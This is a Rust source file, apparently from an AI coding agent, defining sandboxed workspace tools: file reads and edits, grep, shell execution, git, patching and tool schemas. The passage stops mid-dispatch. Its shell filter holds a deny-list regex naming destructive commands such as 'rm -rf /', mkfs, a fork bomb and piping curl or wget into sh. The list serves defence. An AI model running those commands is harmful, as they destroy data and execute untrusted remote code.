//! Workspace-scoped tools + lightweight sandbox.
//!
//! Tool surface mirrors the useful core of Grok Build:
//!   `read_file`, `search_replace`, `list_dir`, `grep`, `run_shell`, `todo_write`
//! plus `write_file` (full writes) and `search_code` (literal search).
//!
//! All file paths are relative to the workspace root and confined to it.
//! [`Sandbox::safe_resolve`] rejects `..` traversal. [`Sandbox::run_shell`]
//! blocks a set of destructive patterns and strips secret env vars.
//!
//! Tools are dispatched by name via [`dispatch`]; the OpenAI function-calling
//! schemas are produced by [`tool_definitions`].

use anyhow::{bail, Context, Result};
use regex::Regex;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Mutex, OnceLock};
use walkdir::WalkDir;

const MAX_TOOL_OUTPUT: usize = 12_000;
const MAX_LINE_LENGTH: usize = 2000;

fn dangerous_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"(?i)(rm\s+(-[a-z]*f[a-z]*\s+)?/|mkfs|: \(\)\s*\{\s*:\|:&\s*\};:|dd\s+if=/dev/(zero|random|urandom)|chmod\s+(-R\s+)?777\s+/|curl\s+.*\|\s*(ba)?sh|wget\s+.*\|\s*(ba)?sh)",
        )
        .expect("valid regex")
    })
}

/// Normalize a path by resolving `.` and `..` components lexically.
///
/// Does not touch the filesystem — purely lexical normalization. This lets
/// us detect path traversal (`..` escaping the workspace) without relying on
/// `canonicalize()` (which fails for non-existent paths).
fn normalize_path(p: &Path) -> PathBuf {
    let mut components = Vec::new();
    for comp in p.components() {
        match comp {
            std::path::Component::ParentDir => {
                // Pop the last component if it's a normal name (not root)
                if let Some(std::path::Component::Normal(_)) = components.last() {
                    components.pop();
                } else {
                    components.push(comp);
                }
            }
            std::path::Component::CurDir => {} // skip "."
            other => components.push(other),
        }
    }
    components.iter().collect()
}

/// A workspace sandbox that confines file operations and shell commands.
///
/// All tool methods resolve paths relative to `workspace` and reject any
/// target that escapes it. `run_shell` additionally blocks destructive
/// patterns and strips secret environment variables.
#[derive(Clone)]
pub struct Sandbox {
    /// The workspace root; all paths are confined to this directory.
    pub workspace: PathBuf,
}

impl Sandbox {
    /// Create a sandbox rooted at `workspace`.
    pub fn new(workspace: PathBuf) -> Self {
        Self { workspace }
    }

    /// Resolve `path` relative to the workspace, rejecting traversal and
    /// symlink escapes.
    ///
    /// Two defenses:
    /// 1. Lexical `..` traversal is rejected via [`normalize_path`].
    /// 2. The nearest existing ancestor is canonicalized (resolving symlinks)
    ///    and must remain inside the canonicalized workspace. This blocks
    ///    `workspace/link -> /etc` from escaping on both read and write
    ///    (including writes whose parent directory is a symlink pointing out).
    fn safe_resolve(&self, path: &str) -> Result<PathBuf> {
        let joined = self.workspace.join(path);
        let normalized = normalize_path(&joined);
        if !normalized.starts_with(&self.workspace) {
            bail!(
                "Path outside workspace: {}. Use relative paths like 'src/main.rs', not absolute paths starting with /",
                path
            );
        }

        let ws_canon = self
            .workspace
            .canonicalize()
            .unwrap_or_else(|_| self.workspace.clone());

        // If the workspace itself is not resolvable (e.g. deleted between
        // construction and use), symlink confinement is meaningless — fall back
        // to the lexical check, which has already passed above.
        if !self.workspace.exists() {
            return Ok(normalized);
        }

        // Walk up from the requested path to the nearest existing ancestor.
        // Canonicalizing that ancestor resolves any symlinks along the way and
        // lets us verify it still lies inside the workspace.
        let mut probe: &Path = normalized.as_path();
        let mut suffix: Vec<std::ffi::OsString> = Vec::new();
        while !probe.exists() {
            if let Some(name) = probe.file_name() {
                suffix.push(name.to_os_string());
            }
            match probe.parent() {
                Some(p) if !p.as_os_str().is_empty() => probe = p,
                _ => break,
            }
        }

        let anchor_canon = probe.canonicalize().unwrap_or_else(|_| probe.to_path_buf());
        if !anchor_canon.starts_with(&ws_canon) {
            bail!(
                "Path outside workspace via symlink: {}. All paths must stay within the workspace root.",
                path
            );
        }

        // Rebuild the target from the canonical anchor plus any non-existent suffix.
        let mut target = anchor_canon;
        for seg in suffix.iter().rev() {
            target.push(seg);
        }
        Ok(target)
    }

    /// List the contents of a directory (dirs first, then files, alphabetical).
    pub fn list_dir(&self, path: &str) -> Result<String> {
        let p = self.safe_resolve(path)?;
        if !p.exists() {
            return Ok(format!("Error: {} does not exist", path));
        }
        if !p.is_dir() {
            return Ok(format!("Error: {} is not a directory", path));
        }
        let mut items = Vec::new();
        let mut entries: Vec<_> = std::fs::read_dir(&p)?.filter_map(|e| e.ok()).collect();
        entries.sort_by_key(|e| {
            let is_dir = e.file_type().map(|t| t.is_dir()).unwrap_or(false);
            (!is_dir, e.file_name().to_string_lossy().to_lowercase())
        });
        for e in entries {
            let name = e.file_name().to_string_lossy().into_owned();
            let kind = if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                "dir "
            } else {
                "file"
            };
            let size = if e.path().is_file() {
                e.metadata()
                    .map(|m| format!("  ({} B)", m.len()))
                    .unwrap_or_default()
            } else {
                String::new()
            };
            items.push(format!("{} {}{}", kind, name, size));
        }
        Ok(if items.is_empty() {
            "(empty)".into()
        } else {
            items.join("\n")
        })
    }

    /// Read a file, returning a numbered line range (1-based `start_line`, up to `max_lines`).
    /// Lines longer than 2000 chars are truncated.
    pub fn read_file(&self, path: &str, start_line: usize, max_lines: usize) -> Result<String> {
        let p = self.safe_resolve(path)?;
        if !p.exists() {
            return Ok(format!(
                "Error: {} does not exist. Use list_dir to see available files, then use a relative path like 'src/main.rs'.",
                path
            ));
        }
        if !p.is_file() {
            return Ok(format!(
                "Error: {} is not a file. Use list_dir to see available files. Paths are relative to the workspace root, e.g. 'README.md' not '.README.md'.",
                path
            ));
        }
        let text = std::fs::read_to_string(&p).context("read file")?;
        let lines: Vec<&str> = text.lines().collect();
        let start = start_line.saturating_sub(1);
        let end = (start + max_lines).min(lines.len());
        let mut out = format!(
            "--- {} (lines {}-{} of {}) ---\n",
            path,
            start + 1,
            end,
            lines.len()
        );
        for (i, line) in lines[start..end].iter().enumerate() {
            // Truncate very long lines for the model
            let truncated: String = line.chars().take(MAX_LINE_LENGTH).collect();
            let rendered = format!("{:5}| {}\n", start + i + 1, truncated);
            // Stop accumulating once we pass the tool output cap; a runaway
            // `max_lines` must not flood the model's context window.
            if out.chars().count() + rendered.chars().count() > MAX_TOOL_OUTPUT {
                out.push_str(&format!("…[truncated at {} chars]", MAX_TOOL_OUTPUT));
                break;
            }
            out.push_str(&rendered);
        }
        Ok(out)
    }

    /// Full file write (create/overwrite).
    pub fn write_file(&self, path: &str, content: &str) -> Result<String> {
        let p = self.safe_resolve(path)?;
        if let Some(parent) = p.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::write(&p, content)?;
        Ok(format!("Wrote {} bytes → {}", content.len(), path))
    }

    /// Search-and-replace edit (Grok Build `search_replace` semantics).
    ///
    /// - `old_string` empty → create new file (like write_file).
    /// - `replace_all` → replace every occurrence.
    /// - Otherwise replace the first occurrence (must be unique).
    pub fn search_replace(
        &self,
        path: &str,
        old_string: &str,
        new_string: &str,
        replace_all: bool,
    ) -> Result<String> {
        let p = self.safe_resolve(path)?;
        if p.is_dir() {
            return Ok("Error: file path is a directory".into());
        }

        // New-file creation path
        if old_string.is_empty() {
            if p.exists() {
                return Ok(format!(
                    "Error: {} already exists; cannot create with empty old_string",
                    path
                ));
            }
            if let Some(parent) = p.parent() {
                std::fs::create_dir_all(parent)?;
            }
            std::fs::write(&p, new_string)?;
            return Ok(format!("Created {} ({} bytes)", path, new_string.len()));
        }

        if !p.is_file() {
            return Ok(format!("Error: {} is not a file", path));
        }

        let content = std::fs::read_to_string(&p).context("read file before edit")?;

        if replace_all {
            let count = content.matches(old_string).count();
            if count == 0 {
                return Ok(format!("Error: old_string not found in {}", path));
            }
            let new_content = content.replace(old_string, new_string);
            std::fs::write(&p, &new_content)?;
            return Ok(format!("Replaced {} occurrence(s) in {}", count, path));
        }

        // Single replace — must be unique
        let first = content.find(old_string);
        let last = content.rfind(old_string);
        match (first, last) {
            (Some(f), Some(l)) if f == l => {
                let mut new_content = String::with_capacity(content.len() + new_string.len());
                new_content.push_str(&content[..f]);
                new_content.push_str(new_string);
                new_content.push_str(&content[f + old_string.len()..]);
                std::fs::write(&p, &new_content)?;
                Ok(format!("Edited {}", path))
            }
            (Some(_), Some(_)) => Ok(format!(
                "Error: old_string is not unique in {}. \
                     Provide more context or use replace_all.",
                path
            )),
            _ => Ok(format!("Error: old_string not found in {}", path)),
        }
    }

    /// Run a shell command in the workspace with a timeout.
    ///
    /// `cwd` is forced to the workspace; secret env vars are stripped; dangerous
    /// patterns are blocked. Output is capped at 12 000 chars.
    pub fn run_shell(&self, command: &str, timeout_secs: u64) -> Result<String> {
        if dangerous_re().is_match(command) {
            return Ok("Error: command blocked by sandbox filter".into());
        }
        let mut cmd = Command::new("sh");
        cmd.arg("-c")
            .arg(command)
            .current_dir(&self.workspace)
            .env("PWD", &self.workspace)
            .env_remove("AWS_SECRET_ACCESS_KEY")
            .env_remove("OPENAI_API_KEY")
            .env_remove("XAI_API_KEY")
            .env_remove("ANTHROPIC_API_KEY")
            .env_remove("RAVEN_API_KEY")
            .env_remove("OLLAMA_API_KEY")
            .env_remove("GITHUB_TOKEN")
            .env_remove("GITLAB_TOKEN")
            .env_remove("DATABASE_URL")
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());

        let mut child = cmd.spawn().context("spawn shell")?;

        // Drain stdout/stderr in background threads to prevent pipe deadlock
        // when a child produces more than the OS pipe buffer (~64KB on Linux).
        let stdout_handle = child.stdout.take().map(|mut out| {
            std::thread::spawn(move || {
                let mut buf = Vec::new();
                let _ = std::io::Read::read_to_end(&mut out, &mut buf);
                buf
            })
        });
        let stderr_handle = child.stderr.take().map(|mut err| {
            std::thread::spawn(move || {
                let mut buf = Vec::new();
                let _ = std::io::Read::read_to_end(&mut err, &mut buf);
                buf
            })
        });

        // Wait for the child with timeout
        let start = std::time::Instant::now();
        let status = loop {
            match child.try_wait() {
                Ok(Some(status)) => break status,
                Ok(None) => {
                    if start.elapsed().as_secs() > timeout_secs {
                        let _ = child.kill();
                        let _ = child.wait();
                        return Ok("Error: command timed out".into());
                    }
                    std::thread::sleep(std::time::Duration::from_millis(50));
                    continue;
                }
                Err(e) => return Ok(format!("Error: {}", e)),
            }
        };

        // Collect pipe output from background threads
        let stdout = stdout_handle
            .and_then(|h| h.join().ok())
            .unwrap_or_default();
        let stderr = stderr_handle
            .and_then(|h| h.join().ok())
            .unwrap_or_default();

        let mut out = format!("exit={}\n", status.code().unwrap_or(-1));
        out.push_str(&String::from_utf8_lossy(&stdout));
        out.push_str(&String::from_utf8_lossy(&stderr));
        if out.len() > MAX_TOOL_OUTPUT {
            out.truncate(MAX_TOOL_OUTPUT);
            out.push_str("\n...[truncated]");
        }
        Ok(out)
    }

    /// Regex content search (Grok Build `grep` semantics, pure-Rust fallback).
    pub fn grep(
        &self,
        pattern: &str,
        path: &str,
        include: Option<&str>,
        max_results: usize,
    ) -> Result<String> {
        let re = match Regex::new(pattern) {
            Ok(r) => r,
            Err(e) => return Ok(format!("Error: invalid regex: {}", e)),
        };
        let search_root = if path.is_empty() {
            self.workspace.clone()
        } else {
            self.safe_resolve(path)?
        };
        if !search_root.exists() {
            return Ok(format!("Error: {} does not exist", path));
        }

        let skip = [
            ".git",
            "node_modules",
            "__pycache__",
            ".venv",
            "venv",
            "target",
            "dist",
            "build",
        ];
        let mut results = Vec::new();
        let mut searched = 0u32;

        for entry in WalkDir::new(&search_root)
            .into_iter()
            .filter_entry(|e| {
                // Always allow the root entry (depth 0)
                if e.depth() == 0 {
                    return true;
                }
                let name = e.file_name().to_string_lossy();
                !skip.iter().any(|s| *s == name) && !name.starts_with('.')
            })
            .filter_map(|e| e.ok())
        {
            if !entry.file_type().is_file() {
                continue;
            }
            let p = entry.path();
            // Optional glob include filter
            if let Some(inc) = include {
                if !glob_matches(p, inc) {
                    continue;
                }
            }
            searched += 1;
            let Ok(text) = std::fs::read_to_string(p) else {
                continue;
            };
            for (i, line) in text.lines().enumerate() {
                if re.is_match(line) {
                    let rel = p.strip_prefix(&self.workspace).unwrap_or(p);
                    let snippet: String = line.trim().chars().take(220).collect();
                    results.push(format!("{}:{}: {}", rel.display(), i + 1, snippet));
                    if results.len() >= max_results {
                        return Ok(results.join("\n"));
                    }
                }
            }
        }
        Ok(if results.is_empty() {
            format!("No matches (searched {} files)", searched)
        } else {
            results.join("\n")
        })
    }

    // ── Git tools (read-only) ───────────────────────────────────────────

    /// `git status --porcelain=v1` — structured, compact output.
    pub fn git_status(&self) -> Result<String> {
        let out = self.run_git(&["status", "--porcelain=v1"])?;
        Ok(if out.trim().is_empty() {
            "No changes (working tree clean)".into()
        } else {
            out
        })
    }

    /// `git diff` — unstaged or staged changes.
    pub fn git_diff(&self, staged: bool) -> Result<String> {
        let args = if staged {
            &["diff", "--staged"][..]
        } else {
            &["diff"][..]
        };
        let out = self.run_git(args)?;
        Ok(truncate_output(&out, MAX_TOOL_OUTPUT))
    }

    /// `git log --oneline -n 10` — recent commit history.
    pub fn git_log(&self, n: usize) -> Result<String> {
        let n_str = n.to_string();
        let out = self.run_git(&["log", "--oneline", "-n", &n_str])?;
        Ok(out)
    }

    fn run_git(&self, args: &[&str]) -> Result<String> {
        let output = Command::new("git")
            .args(args)
            .current_dir(&self.workspace)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .output()
            .context("spawn git")?;
        let mut out = String::new();
        if !output.stdout.is_empty() {
            out.push_str(&String::from_utf8_lossy(&output.stdout));
        }
        if !output.stderr.is_empty() {
            if !out.is_empty() {
                out.push('\n');
            }
            out.push_str(&String::from_utf8_lossy(&output.stderr));
        }
        if out.is_empty() {
            out = format!("exit={}", output.status.code().unwrap_or(-1));
        }
        Ok(out)
    }

    // ── apply_patch (unified diff) ──────────────────────────────────────

    /// Apply a unified diff patch to files in the workspace.
    ///
    /// Supports multiple hunks and files. Rejects if context lines don't match.
    pub fn apply_patch(&self, patch_text: &str) -> Result<String> {
        let hunks = parse_unified_diff(patch_text);
        if hunks.is_empty() {
            return Ok("Error: no valid hunks found in patch".into());
        }

        let mut changed_files = Vec::new();
        for hunk in &hunks {
            let path = self.safe_resolve(&hunk.file_path)?;
            if !path.is_file() {
                return Ok(format!(
                    "Error: {} is not a file (cannot patch)",
                    hunk.file_path
                ));
            }
            let content = std::fs::read_to_string(&path).context("read file for patch")?;
            let new_content = apply_hunk(&content, hunk)?;
            if new_content.starts_with("Error:") {
                return Ok(new_content);
            }
            std::fs::write(&path, new_content)?;
            changed_files.push(hunk.file_path.clone());
        }

        Ok(format!(
            "Patched {} file(s): {}",
            changed_files.len(),
            changed_files.join(", ")
        ))
    }

    // ── run_tests ───────────────────────────────────────────────────────

    /// Auto-detect and run the project's test suite.
    pub fn run_tests(&self) -> Result<String> {
        let runner = if self.workspace.join("Cargo.toml").exists() {
            TestRunner::Cargo
        } else if self.workspace.join("package.json").exists() {
            TestRunner::Npm
        } else if self.workspace.join("pytest.ini").exists()
            || self.workspace.join("pyproject.toml").exists()
            || self.workspace.join("setup.py").exists()
        {
            TestRunner::Pytest
        } else {
            return Ok(
                "No test runner detected (no Cargo.toml, package.json, or pytest config found)"
                    .into(),
            );
        };

        let (cmd, args) = match runner {
            TestRunner::Cargo => ("cargo", vec!["test"]),
            TestRunner::Npm => ("npm", vec!["test"]),
            TestRunner::Pytest => ("pytest", vec![]),
        };

        let output = Command::new(cmd)
            .args(&args)
            .current_dir(&self.workspace)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .output()
            .context("spawn test runner")?;

        let mut out = format!(
            "--- run_tests ({}) exit={} ---\n",
            cmd,
            output.status.code().unwrap_or(-1)
        );
        out.push_str(&String::from_utf8_lossy(&output.stdout));
        if !output.stderr.is_empty() {
            out.push_str(&String::from_utf8_lossy(&output.stderr));
        }
        Ok(truncate_output(&out, MAX_TOOL_OUTPUT))
    }
}

/// Truncate output to max chars with a clear marker.
///
/// Char-safe: truncates on a character boundary so multi-byte UTF-8 (non-ASCII
/// text in diffs, test output, etc.) never panics on a byte-slice boundary.
fn truncate_output(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        s.to_string()
    } else {
        let truncated: String = s.chars().take(max).collect();
        format!("{}\n...[truncated at {} chars]", truncated, max)
    }
}

enum TestRunner {
    Cargo,
    Npm,
    Pytest,
}

/// A parsed hunk from a unified diff.
struct DiffHunk {
    file_path: String,
    old_start: usize,
    lines: Vec<(DiffLineType, String)>,
}

#[derive(PartialEq)]
enum DiffLineType {
    Context,
    Remove,
    Add,
}

/// Parse a unified diff into hunks.
///
/// Supports the standard format:
///   --- a/file.rs
///   +++ b/file.rs
///   @@ -start,count +start,count @@
///    context line
///   -removed line
///   +added line
fn parse_unified_diff(text: &str) -> Vec<DiffHunk> {
    let mut hunks = Vec::new();
    let mut current_file: Option<String> = None;
    let mut current_hunk: Option<DiffHunk> = None;

    for line in text.lines() {
        if let Some(rest) = line.strip_prefix("--- ") {
            let path = rest.trim().strip_prefix("a/").unwrap_or(rest.trim());
            current_file = Some(path.to_string());
        } else if let Some(rest) = line.strip_prefix("+++ ") {
            let path = rest.trim().strip_prefix("b/").unwrap_or(rest.trim());
            current_file = Some(path.to_string());
        } else if line.starts_with("@@ ") {
            // Flush previous hunk
            if let Some(h) = current_hunk.take() {
                hunks.push(h);
            }
            let file = current_file.clone().unwrap_or_default();
            // Parse @@ -start,count +start,count @@
            let parts: Vec<&str> = line.split_whitespace().collect();
            let old_start = parts
                .get(1)
                .and_then(|s| s.strip_prefix('-'))
                .and_then(|s| s.split(',').next())
                .and_then(|s| s.parse().ok())
                .unwrap_or(1);
            current_hunk = Some(DiffHunk {
                file_path: file,
                old_start,
                lines: Vec::new(),
            });
        } else if let Some(h) = current_hunk.as_mut() {
            if line.starts_with('-') && !line.starts_with("---") {
                h.lines.push((DiffLineType::Remove, line[1..].to_string()));
            } else if line.starts_with('+') && !line.starts_with("+++") {
                h.lines.push((DiffLineType::Add, line[1..].to_string()));
            } else if line.starts_with(' ') || line.is_empty() {
                h.lines.push((
                    DiffLineType::Context,
                    line.trim_start_matches(' ').to_string(),
                ));
            }
        }
    }

    if let Some(h) = current_hunk.take() {
        hunks.push(h);
    }
    hunks
}

/// Apply a single hunk to file content.
///
/// Finds the context lines in the file content starting at old_start,
/// replaces removed lines with added lines.
fn apply_hunk(content: &str, hunk: &DiffHunk) -> Result<String> {
    let lines: Vec<&str> = content.lines().collect();
    let start_idx = hunk.old_start.saturating_sub(1);

    // Build the expected context (context + remove lines) and replacement (context + add lines)
    let mut expected: Vec<&str> = Vec::new();
    let mut replacement: Vec<String> = Vec::new();

    for (line_type, text) in &hunk.lines {
        match line_type {
            DiffLineType::Context => {
                expected.push(text.as_str());
                replacement.push(text.clone());
            }
            DiffLineType::Remove => {
                expected.push(text.as_str());
            }
            DiffLineType::Add => {
                replacement.push(text.clone());
            }
        }
    }

    // Verify context matches
    if start_idx + expected.len() > lines.len() {
        return Ok(format!(
            "Error: patch context exceeds file length for {}",
            hunk.file_path
        ));
    }

    for (i, expected_line) in expected.iter().enumerate() {
        let file_line = lines[start_idx + i].trim_end();
        let exp = expected_line.trim_end();
        if file_line != exp {
            return Ok(format!(
                "Error: patch context mismatch in {} at line {}: expected {:?}, got {:?}",
                hunk.file_path,
                start_idx + i + 1,
                exp,
                file_line
            ));
        }
    }

    // Build the new content: lines before hunk + replacement + lines after hunk
    let mut result = Vec::new();
    for &line in &lines[..start_idx] {
        result.push(line.to_string());
    }
    for line in &replacement {
        result.push(line.clone());
    }
    for &line in &lines[start_idx + expected.len()..] {
        result.push(line.to_string());
    }

    Ok(result.join("\n") + if content.ends_with('\n') { "\n" } else { "" })
}

/// Minimal glob matcher: supports `*` and `?` against the file name.
fn glob_matches(path: &Path, pattern: &str) -> bool {
    let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
    glob_segment_match(name, pattern)
}

pub fn glob_segment_match(text: &str, pat: &str) -> bool {
    let t = text.as_bytes();
    let p = pat.as_bytes();
    let (mut ti, mut pi) = (0, 0);
    let (mut star_t, mut star_p): (Option<usize>, Option<usize>) = (None, None);
    while ti < t.len() {
        if pi < p.len() && (p[pi] == b'?' || p[pi] == t[ti]) {
            ti += 1;
            pi += 1;
        } else if pi < p.len() && p[pi] == b'*' {
            star_p = Some(pi);
            star_t = Some(ti);
            pi += 1;
        } else if let (Some(sp), Some(st)) = (star_p, star_t) {
            pi = sp + 1;
            ti = st + 1;
            star_t = Some(ti);
        } else {
            return false;
        }
    }
    while pi < p.len() && p[pi] == b'*' {
        pi += 1;
    }
    pi == p.len()
}

// ── Todo state ────────────────────────────────────────────────────────

/// A single todo item (content + status + priority).
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct TodoItem {
    pub content: String,
    pub status: String,
    pub priority: String,
}

/// In-memory todo store (shared across tool calls within one agent run).
pub static TODO_STATE: OnceLock<Mutex<Vec<TodoItem>>> = OnceLock::new();

fn todo_state() -> &'static Mutex<Vec<TodoItem>> {
    TODO_STATE.get_or_init(|| Mutex::new(Vec::new()))
}

/// Full-replace todo list (Grok Build `todo_write` semantics).
pub fn todo_write(todos: Vec<TodoItem>) -> Result<String> {
    let mut state = todo_state().lock().unwrap_or_else(|e| e.into_inner());
    *state = todos;
    Ok(summarize_todos(&state))
}

fn summarize_todos(todos: &[TodoItem]) -> String {
    if todos.is_empty() {
        return "No tasks".into();
    }
    let mut out = String::new();
    for (i, t) in todos.iter().enumerate() {
        let mark = match t.status.as_str() {
            "completed" => "[completed]",
            "in_progress" => "[in_progress]",
            _ => "[pending]",
        };
        out.push_str(&format!("{} {}: {}\n", mark, i + 1, t.content));
    }
    out
}

/// OpenAI-style function-calling tool definitions for the model.
///
/// Returns a JSON array of tool schemas consumed by the `/v1/chat/completions`
/// `tools` field. The names here must match the arms in [`dispatch`].
pub fn tool_definitions() -> serde_json::Value {
    serde_json::json!([
        {
            "type": "function",
            "function": {
                "name": "list_dir",
                "description": "List files and directories relative to the workspace root.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": { "type": "string", "description": "Relative path (default '.')" }
                    },
                    "required": []
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "read_file",
                "description": "Read a file (optionally a line range). Always prefer reading before editing.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": { "type": "string" },
                        "start_line": { "type": "integer", "description": "1-based start" },
                        "max_lines": { "type": "integer", "description": "Max lines (default 200)" }
                    },
                    "required": ["path"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "search_replace",
                "description": "Edit a file by replacing an exact string. If old_string is empty, create a new file. Use replace_all to replace every occurrence; otherwise old_string must be unique.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": { "type": "string" },
                        "old_string": { "type": "string", "description": "Exact text to find (empty = create new file)" },
                        "new_string": { "type": "string" },
                        "replace_all": { "type": "boolean", "description": "Replace all occurrences (default false)" }
                    },
                    "required": ["path", "old_string", "new_string"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "write_file",
                "description": "Write full content to a file (creates parent dirs). Prefer search_replace for edits to existing files.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": { "type": "string" },
                        "content": { "type": "string" }
                    },
                    "required": ["path", "content"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "grep",
                "description": "Search file contents with a regex pattern. Returns matching lines with file:line: snippet.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "pattern": { "type": "string", "description": "Rust regex pattern" },
                        "path": { "type": "string", "description": "Relative directory to search (default workspace root)" },
                        "include": { "type": "string", "description": "Glob filter for file names, e.g. '*.rs'" },
                        "max_results": { "type": "integer" }
                    },
                    "required": ["pattern"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "run_shell",
                "description": "Run a shell command inside the workspace sandbox. Prefer dedicated tools (read_file, grep, list_dir) over cat/grep/find.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "command": { "type": "string" },
                        "timeout": { "type": "integer", "description": "Seconds (default 60)" }
                    },
                    "required": ["command"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "search_code",
                "description": "Search source files for a literal text query (case-insensitive). Prefer grep for regex.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "query": { "type": "string" },
                        "max_results": { "type": "integer" }
                    },
                    "required": ["query"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "todo_write",
                "description": "Create or replace a structured task list. Use for any task with 3+ steps. Send the complete list each call (full-replace).",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "todos": {
                            "type": "array",
                            "items": {
                                "type": "object",
                                "properties": {
                                    "content": { "type": "string" },
                                    "status": { "type": "string", "enum": ["pending", "in_progress", "completed"] },
                                    "priority": { "type": "string", "enum": ["low", "medium", "high"] }
                                },
                                "required": ["content", "status"]
                            }
                        }
                    },
                    "required": ["todos"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "memory_update",
                "description": "Save a durable project fact to memory (persists across sessions). Use for conventions, decisions, or context — not ephemeral task progress.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "section": { "type": "string", "enum": ["Conventions", "Decisions", "Context"], "description": "Memory section to append to" },
                        "content": { "type": "string", "description": "Content to append (one fact per call)" }
                    },
                    "required": ["section", "content"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "git_status",
                "description": "Show working tree status (git status --porcelain). Read-only.",
                "parameters": { "type": "object", "properties": {} }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "git_diff",
                "description": "Show unstaged changes (git diff). Set staged=true for staged changes. Read-only.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "staged": { "type": "boolean", "description": "Show staged changes instead of unstaged (default false)" }
                    }
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "git_log",
                "description": "Show recent commit history (git log --oneline). Read-only.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "n": { "type": "integer", "description": "Number of commits to show (default 10)" }
                    }
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "apply_patch",
                "description": "Apply a unified diff patch to files. Supports multiple hunks and files. Rejects if context doesn't match.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "patch": { "type": "string", "description": "Unified diff format patch text" }
                    },
                    "required": ["patch"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "run_tests",
                "description": "Auto-detect and run the project's test suite (cargo test, npm test, or pytest). Returns output with exit code.",
                "parameters": { "type": "object", "properties": {} }
            }
        }
    ])
}

/// Dispatch a tool call by name, returning the result as a string.
///
/// Unknown tool names return an error string rather than `Err`, so the model
/// receives actionable feedback. Tool errors are also stringified.
pub fn dispatch(sandbox: &Sandbox, name: &str, args: &serde_json::Value) -> String {
    let res = match name {
        "list_dir" => {
            let path = args.get("path").and_then(|v| v.as_str()).unwrap_or(".");
            sandbox.list_dir(path)
        }
        "read_file" => {
            let path = args.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let start = args.get("start_line").and_then(|v| v.as_u64()).unwrap_or(1) as usize;
            let max = args
                .get("max_lines")
                .and_then(|v| v.as_u64())
                .unwrap_or(200) as usize;
            sandbox.read_file(path, start, max)
        }
        "search_replace" => {
            let path = args.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let old = args
                .get("old_string")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            let new = args
                .get("new_string")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            let all = args
                .get("replace_all")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            sandbox.search_replace(path, old, new, all)
        }
        "write_file" => {
            let path = args.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let content = args.get("content").and_then(|v| v.as_str()).unwrap_or("");
            sandbox.write_file(path, content)
        }
        "grep" => {
            let pattern = args.get("pattern").and_then(|v| v.as_str()).unwrap_or("");
            let path = args.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let include = args.get("include").and_then(|v| v.as_str());
            let max = args
                .get("max_results")
                .and_then(|v| v.as_u64())
                .unwrap_or(50) as usize;
            sandbox.grep(pattern, path, include, max)
        }
        "run_shell" => {
            let command = args.get("command").and_then(|v| v.as_str()).unwrap_or("");
            let timeout = args.get("timeout").and_then(|v| v.as_u64()).unwrap_or(60);
            sandbox.run_shell(command, timeout)
        }
        "search_code" => {
            let query = args.get("query").and_then(|v| v.as_str()).unwrap_or("");
            let max = args
                .get("max_results")
                .and_then(|v| v.as_u64())
                .unwrap_or(25) as usize;
            sandbox_search_code(sandbox, query, max)
        }
        "todo_write" => {
            let todos = match args.get("todos").and_then(|v| v.as_array()) {
                Some(arr) => arr
                    .iter()
                    .map(|t| TodoItem {
                        content: t
                            .get("content")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string(),
                        status: t
                            .get("status")
                            .and_then(|v| v.as_str())
                            .unwrap_or("pending")
                            .to_string(),
                        priority: t
                            .get("priority")
                            .and_then(|v| v.as_str())
                            .unwrap_or("medium")
                            .to_string(),
                    })
                    .collect(),
                None => Vec::new(),
            };
            todo_write(todos)
        }
        "memory_update" => {
            let section = args.get("section").and_then(|v| v.as_str()).unwrap_or("");
            let content = args.get("content").and_then(|v| v.as_str()).unwrap_or("");
            crate::memory::update_memory(&sandbox.workspace, section, content)
        }
        "git_status" => sandbox.git_status(),
        "git_diff" => {
            let staged = args
                .get("staged")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            sandbox.git_diff(staged)
        }
        "git_log" => {
            let n = args.get("n").and_then(|v| v.as_u64()).unwrap_or(10) as usize;
            sandbox.git_log(n)
        }
        "apply_patch" => {
